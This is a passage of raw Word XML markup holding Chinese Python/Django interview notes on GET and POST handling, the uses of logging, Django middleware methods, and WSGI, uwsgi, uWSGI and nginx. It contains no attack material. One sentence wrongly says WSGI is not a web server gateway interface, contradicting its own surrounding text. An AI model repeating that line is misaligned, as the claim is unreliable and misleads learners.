          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>内提交</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI" w:hint="eastAsia"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D9BE8D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对于</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>GET</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>方式，服务器端用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>Request.QueryString</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>获取变量的值，对于</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>POST</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>方式，服务器端用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>Request.Form</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>获取提交的数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="514001D4"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2.11 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>项目中日志的作用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F9302A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一、日志相关概念</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI" w:hint="eastAsia"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65DA667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lastRenderedPageBreak/>
        <w:t>1.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>日志是一种可以追踪某些软件运行时所发生事件的方法</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI" w:hint="eastAsia"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06999EE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软件开发人员可以向他们的代码中调用日志记录相关的方法来表明发生了某些事情</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI" w:hint="eastAsia"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E70C154"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一个事件可以用一个包含可选变量数据的消息来描述</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI" w:hint="eastAsia"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56B5981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此外，事件也有重要性的概念，这个重要性也可以被成为严重性级别</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve">(level) </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F97BB3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二、日志的作用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI" w:hint="eastAsia"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AF6DEB0"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通过</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>log</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>的分析，可以方便用户了解系统或软件、应用的运行情况</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve">; </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BC9E35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如果你的应用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>log</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>足够丰富，可以分析以往用户的操作行为、类型喜好，地域分布或其他更多信息</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve">; </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B24A0C3"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如果一个应用的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>log</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>同时也分了多个级别，那么可以很轻易地分析得到该应用的健康状况，及时发现问题并快速定位、解决问题，补救损失。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1738060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简单来讲就是我们通过记录和分析日志可以了解一个系统或软件程序运行情况是否正常，也可以在应用程序出现故障时快速定位问题。不仅在开发中，在运维中日志也很重要，日志的作用也可以简单。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B4BDBF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总结为以下几点：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> 1.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>程序调试</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI" w:hint="eastAsia"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>了解软件程序运行情况，是否正常</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI" w:hint="eastAsia"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> 3,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>软件程序运行故障分析与问题定位</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI" w:hint="eastAsia"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>4,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>如果应用的日志信息足够详细和丰富，还可以用来做用户行为分析</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI" w:hint="eastAsia"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="084246A9"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2.12 django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>中间件的使用？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="719D7026"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Django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>在中间件中预置了六个方法，这六个方法的区别在于不同的阶段执行，对输入或输出进行干预，方法如下：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FE448D5" w14:textId="77777777" w:rsidR="00191162" w:rsidRDefault="00191162" w:rsidP="00114D1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初始化：无需任何参数，服务器响应第一个请求的时候调用一次，用于确定是否启用当前中间件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33CAE3E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__init__():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0996DF0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7BF7DB66" w14:textId="77777777" w:rsidR="00191162" w:rsidRDefault="00191162" w:rsidP="00114D1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处理请求前：在每个请求上调用，返回</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>None</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>或</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>HttpResponse</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>对象。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EA8C48C"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process_request(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B892FA9"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38F64987" w14:textId="77777777" w:rsidR="00191162" w:rsidRDefault="00191162" w:rsidP="00114D1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处理视图前</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>在每个请求上调用，返回</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>None</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>或</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>HttpResponse</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>对象。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B6F7F6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process_view(request,view_func,view_args,view_kwargs):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F78926D"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2F9635EB" w14:textId="77777777" w:rsidR="00191162" w:rsidRDefault="00191162" w:rsidP="00114D1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处理模板响应前：在每个请求上调用，返回实现了</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>render</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>方法的响应对象。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="309F3570"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process_template_response(request,response):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66D1E4F3"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1D492143" w14:textId="77777777" w:rsidR="00191162" w:rsidRDefault="00191162" w:rsidP="00114D1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5.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>处理响应后：所有响应返回浏览器之前被调用，在每个请求上调用，返回</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>HttpResponse</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>对象。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="198DB8CC"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process_response(request,response):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CF71916"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5E8A5CEC" w14:textId="77777777" w:rsidR="00191162" w:rsidRDefault="00191162" w:rsidP="00114D1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6.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>异常处理：当视图抛出异常时调用，在每个请求上调用，返回一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>HttpResponse</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>对象。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D1BB45B"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process_exception(request,exception):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AE2F31B"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5F9529F3"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2.13 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>谈一下你对</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>uWSGI</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>nginx</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>的理解？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="787732A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Nginx</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>中</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>HttpUwsgiModule</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>的作用是与</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>uWSGI</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>服务器进行交换。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FDE4526"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lastRenderedPageBreak/>
        <w:t>WSGI</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>是一种通信协议</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI" w:hint="eastAsia"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>WSGI</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI" w:hint="eastAsia"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>不</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>是一种</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>Web</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>服务器网关接口。它是一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>Web</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>服务器（如</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>nginx</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>uWSGI</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>等服务器）与</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>web</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>应用（如用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>Flask</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>框架写的程序）通信的一种规范。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D0F839E"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要注意</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>WSGI/uwsgi/uWSGI</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>这三个概念的区分。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="373922C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WSGI</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>是一种通信协议。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25F933F2"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Uwsgi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI" w:hint="eastAsia"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>其实</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>是一种线路协议而不是通信协议，在此常用于在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>uWSGI</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>服务器与其他网络服务器的数据通信。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="644A8F19"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uWSGI</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>是实现</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>WSGI</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI" w:hint="eastAsia"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>通信</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>协议、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>uwsgi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI" w:hint="eastAsia"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>线路协议</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
